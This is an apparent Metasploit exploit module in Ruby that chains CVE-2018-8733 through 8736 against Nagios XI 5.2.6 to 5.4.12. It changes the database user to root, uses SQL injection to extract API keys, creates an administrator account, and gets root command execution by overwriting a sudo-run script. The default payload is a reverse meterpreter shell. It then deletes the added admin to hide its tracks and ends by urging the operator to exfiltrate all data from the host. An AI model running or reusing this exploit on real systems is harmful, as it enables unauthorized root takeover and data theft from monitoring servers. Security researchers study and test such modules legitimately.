class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::EXE
    include Msf::Exploit::CmdStager
    include Rex::Text

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Nagios XI 5.2.6-5.4.12 remote exploit',
      'Description'    => %q{
        .
      },
      'Author'         =>
        [
          'Cale Smith',    # @0xC413
          'Benny Husted', # @BennyHusted
          'Jared Arave'   # @iotennui
        ],
      'License'        => MSF_LICENSE,
      'Platform'       => 'linux',
      'Arch'           => [ARCH_X86],
            'CmdStagerFlavor' => ['printf'],
      'Targets'        =>
        [
                    ['Nagios XI 5.2.6 <= 5.4.12', upper_version: Gem::Version.new('5.4.12'), lower_version: Gem::Version.new('5.2.6')]
        ],
      'References'     =>
        [
          ['CVE', '2018-8733'],
          ['CVE', '2018-8734'],
          ['CVE', '2018-8735'],
          ['CVE', '2018-8736'],
          ['URL', 'http://blog.redactedsec.net/exploits/2018/04/26/nagios.html']
        ],

      'Privileged'     => true,
      'DefaultOptions' => {
          'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
                    'WSFDELAY' => 30
        },
      'DisclosureDate'  => 'Aug 8 2017',
      'DefaultTarget'   => 0))
    register_options(
      [
        #WSFDelay option is being ignored, getting around this with a call to Rex.sleep
        #Sometimes Nagios doesn't execute commands immediately, so play with this parameter.
        Opt::RPORT(80), OptInt.new('WAIT', [ true, "Number of seconds to wait for exploit to run", 15 ])
      ])
    deregister_options('SRVHOST', 'SRVPORT')
    end

    def check
      print_status "STEP 0: Get Nagios XI version string."
      res = send_request_cgi!({
          'method' => 'GET',
          'uri'    => '/nagiosxi/'
        })

      if !res || !res.get_html_document
        fail_with(Failure::Unknown, 'Could not check nagios version')
      end

      if (@version = res.get_html_document.at('//input[@name = "version"]/@value').text)
        print_good("STEP 0: Found Nagios XI version: #{@version}")
        if Gem::Version.new(@version) < target[:lower_version]
          print_bad('Try nagios_xi_chained for this version.')
        end
        if (Gem::Version.new(@version) <= target[:upper_version] && Gem::Version.new(@version) >= target[:lower_version])
          return CheckCode::Appears
        end
      end
      CheckCode::Safe
  end

    def set_db_user(usr, passwd)
        step = usr == 'root' ? "1" : "6.1"
        print_status "STEP #{step}: Setting Nagios XI DB user to #{usr}."
        res = send_request_cgi({
          'uri' => '/nagiosql/admin/settings.php',
          'method' => 'POST',
          'ctype'  => 'application/x-www-form-urlencoded',
          'encode_params' => true,
          'vars_post'   => {
                'txtRootPath'=>'nagiosql',
                'txtBasePath'=>'/var/www/html/nagiosql/',
                'selProtocol'=>'http',
                'txtTempdir'=>'/tmp',
                'selLanguage'=>'en_GB',
                'txtEncoding'=>'utf-8',
                'txtDBserver'=>'localhost',
                'txtDBport'=>3306,
                'txtDBname'=>'nagiosql',
                'txtDBuser'=> usr,
                'txtDBpass'=> passwd,
                'txtLogoff'=>3600,
                'txtLines'=>15,
                'selSeldisable'=>1
            }

        })

        if !res || res.code != 302
          fail_with(Failure::UnexpectedReply,'STEP #{step}: Unexpected response setting db user to root')
        else
          print_status "STEP #{step}: Received a 302 Response. That's good!"
        end
    end

    def get_api_keys
        print_status 'STEP 2: Exploiting SQLi to extract user API keys.'

        ver = @version.tr('.', '').to_i

        sqli_parm = ver < 530 ? "backend_ticket" : "api_key"

        res = send_request_cgi({
            'uri' => '/nagiosql/admin/helpedit.php',
            'method' => 'POST',
            'ctype' => 'application/x-www-form-urlencoded',
            'encode_params' => true,
            'vars_post' => {
                'selInfoKey1'=>"c'UNION SELECT CONCAT('START_API:',#{sqli_parm},':END_API') FROM nagiosxi.xi_users-- ",
                'hidKey1'=>'common',
                'selInfoKey2'=>'free_variables_name',
                'hidKey2'=>'',
                'selInfoVersion'=>'',
                'hidVersion'=>'',
                'taContent'=>'',
                'modus'=>0
            }
        })


        if !res || res.code != 302 || !res.body
            fail_with(Failure::UnexpectedReply,'STEP 2: Unexpected response extracting api keys')
        else
            print_status "STEP 2: Received a 302 Response. That's good!"
        end

      return parse_api_key(res.body)
    end

    def parse_api_key(res_body)
        begin_positions = res_body.enum_for(:scan, /START_API:/).map { Regexp.last_match.end(0) }
        end_positions = res_body.enum_for(:scan, /:END_API/).map { Regexp.last_match.begin(0) - 1 }
        api_keys = []

        begin_positions.each_with_index do|val, i|
            key = res_body[val..end_positions[i]]
            unless api_keys.include?(key)
                api_keys << key
            end
        end

        if api_keys.length < 1
          fail_with(Failure::Unknown, 'Could not parse api keys')
        else
          print_status "Found #{api_keys.length.to_s} unique api keys"
          api_keys.each do |key|
            print_status key
          end
        end
        return api_keys
    end

    def add_admin(keys, username, password)
        print_status "STEP 3: Using API Keys to add an administrative user..."
        keys.each do |key|
            user_id = try_add_admin(key, username, password)

            if (user_id.to_i > 0)
                print_good "Added user:#{username} password:#{password} userid:#{user_id}"
                return user_id.to_s, key
            end
        end
        fail_with(Failure::Unknown, 'STEP 3: Failed to add a user.')
    end

    def try_add_admin(key, username, passwd)
        print_status "STEP 3: trying to add admin user with key #{key}"
        res = send_request_cgi({
            'uri'=> "/nagiosxi/api/v1/system/user",
            'method' => 'POST',
            'ctype' => 'application/x-www-form-urlencoded',
            'vars_get' => { 'apikey'=>key, 'pretty'=>1},
            'vars_post' =>{
                'username'=> username,
                'password'=> passwd,
                'name'=>'Firsty Lasterson',
                'email'=>"#{username}@localhost",
                'auth_level'=>'admin',
                'force_pw_change':0
            }
        })

        json = res.get_json_document
        return json['userid'] ? json['userid'].to_i : -1
    end

    def delete_admin(key, user_id)

        res = send_request_cgi({
            'uri'=> "/nagiosxi/api/v1/system/user/#{user_id}",
            'method' => 'DELETE',
            'ctype' => 'application/x-www-form-urlencoded',
            'vars_get' => {'apikey'=>key}
        })

        return res.body && res.body.include?("was added successfully") ? username : false
    end

    def login(username, password)
      print_status "STEP 4.1: Authenticate as user #{username} with password #{password}"
      #4.1 Get nsp for login
      print_status "STEP 4.1: Get NSP and nagiosxi for login.."
      res = send_request_cgi({
          'uri' =>'/nagiosxi/login.php',
          'method' => 'POST',
          'ctype' => 'application/x-www-form-urlencoded'
      })

      if !res || !res.body
        fail_with(Failure::Unknown, 'STEP 4.1: Could not get nsp string for login')
      end

      login_nsp = parse_nsp_str(res.body)
      print_status "STEP 4.1: login_nsp #{login_nsp} "

      login_nagiosxi = parse_nagiosxi(res)
      print_status "STEP 4.1: login_nagiosxi #{login_nagiosxi}"

      #4.2 Login to application
      print_status "STEP 4.2: Authenticating..."
      res = send_request_cgi({
          'uri'=> '/nagiosxi/login.php',
          'ctype' => 'application/x-www-form-urlencoded',
          'method' => 'POST',
          'cookie' => "nagiosxi=#{login_nagiosxi};",
          'vars_post'=> {
              'nsp' => login_nsp,
              'page' => 'auth',
              'debug' => '',
              'pageopt' => 'login',
              'username' => username,
              'password' => password,
              'loginButton' => ''
          }
      })

      if !res || res.code != 302
        fail_with(Failure::Unknown, 'STEP 4.2 Could not get authed nsp string.')
      end

      authed_nagiosxi = parse_nagiosxi(res)
      print_status "STEP 4.2: authed_nagiosxi #{authed_nagiosxi}"
      return authed_nagiosxi
    end

    def parse_nsp_str(resp_body)
      nsp_strs = /var nsp_str = "(.+)";\n/.match(resp_body)

      unless nsp_strs || nsp_strs.length < 2
          fail_with(Failure::NotFound, 'Could not find nsp_str')
      end

      return nsp_strs[1]
    end

    def parse_nagiosxi(res)
      cookie = res.get_cookies
      matches = /.*nagiosxi=(.+);/.match(cookie)

      unless matches || matches.length < 2
        fail_with(Failure::NotFound, 'Could not find nagiosxi cookie')
      end

      return matches[1]
    end

    def parse_printf(cmd)
      file_redir = cmd.index(/>>/)
      unless file_redir
        fail_with(Failure::NotFound, 'Could not find file redirection character in printf stager cmd')
      end
      return cmd[0 .. (file_redir -1)]
    end

    def execute_command(cmd, opts = {})
      cmd = parse_printf(cmd)

      cmd_execution = "$(cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak ; #{cmd} > /usr/local/nagiosxi/scripts/reset_config_perms.sh ; sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh) &"

      cmd_cleanup = "$(mv /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak /usr/local/nagiosxi/scripts/reset_config_perms.sh)"

      opts_exec = {
          'uri'=> '/nagiosxi/backend/index.php',
          'method' => 'POST',
          'ctype' => 'application/x-www-form-urlencoded',
          'cookie' => "nagiosxi=#{@nagiosxi}",
          'vars_get' => {
              'cmd'=>'submitcommand',
              'command'=>'1111',
              'command_data'=> cmd_execution
          }
      }

      opts_cleanup = {
          'uri'=> '/nagiosxi/backend/index.php',
          'method' => 'POST',
          'ctype' => 'application/x-www-form-urlencoded',
          'cookie' => "nagiosxi=#{@nagiosxi}",
          'vars_get' => {
              'cmd'=>'submitcommand',
              'command'=>'1111',
              'command_data'=> cmd_cleanup
          }
      }

      print_status "STEP 5.1: executing payload"
      res = send_request_cgi(opts_exec)

      if !res || res.code != 200
        fail_with(Failure::Unknown, 'STEP 5.1: Command execution failed')
      end

      print_status "STEP 5.2: removing scripts from disc"
      res = send_request_cgi(opts_cleanup)

      if !res || res.code != 200
        fail_with(Failure::Unknown, 'STEP 5.2: Command cleanup failed')
      end
    end

  def exploit
    if check != CheckCode::Appears
      fail_with(Failure::NotVulnerable, 'STEP 0: Vulnerable version not found! punt!')
    end


    set_db_user('root', 'nagiosxi')

    keys = get_api_keys

    username = [*('a'..'z'),*('A'..'Z')].shuffle[0,16].join.to_s
    password = [*('a'..'z'),*('A'..'Z')].shuffle[0,16].join.to_s

    user_id, key = add_admin(keys, username, password)
    @nagiosxi = login(username, password)
    execute_cmdstager()

    #revert databaseuser

    set_db_user('nagiosql', 'n@gweb')
    print_status "STEP 6.2: deleting admin"
    delete_admin( key, user_id)
    #The WSFDelay option is being ignored currently, so this is this workaround.
    sleep = datastore['WAIT'].to_i
    Rex.sleep(sleep)
    print_status "Be sure to run post/linux/gather/enum_nagios_xi to exfil all the data off this box!"
  end
end
